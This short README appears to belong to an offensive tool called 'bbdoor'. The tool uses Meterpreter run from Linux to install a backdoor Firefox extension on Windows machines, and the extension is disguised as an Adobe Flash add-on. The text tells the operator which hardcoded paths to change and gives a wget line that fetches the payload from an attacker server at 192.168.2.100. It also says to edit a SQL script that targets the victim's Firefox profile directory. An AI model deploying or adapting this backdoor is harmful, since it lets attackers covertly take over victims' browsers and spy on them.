This script is written to install the scripts into windows firefox only.
Meterpreter has to be run from linux. 

A lot of stuff is hardcoded into the script, needs a cleanup.

At least change these lines in install_extension_firefox_windows.rc:
if (paths =~ /bbdoor/)
bbdoor_path = "/root/bbdoor"

At least change these lines in sqlite.sh:
DIR=/root/bbdoor														# where are the files
XPI=flashX@adobe.com.xpi												# filename of the extension
wget --no-check-certificate -O $DIR/$XPI https://192.168.2.100/$XPI     # this is where the newest xpi can be found

Also modify the sqlite.sql CHANGE_TO_FIREFOX_PROFILE_DIRECTORY variable to the user profile directory.
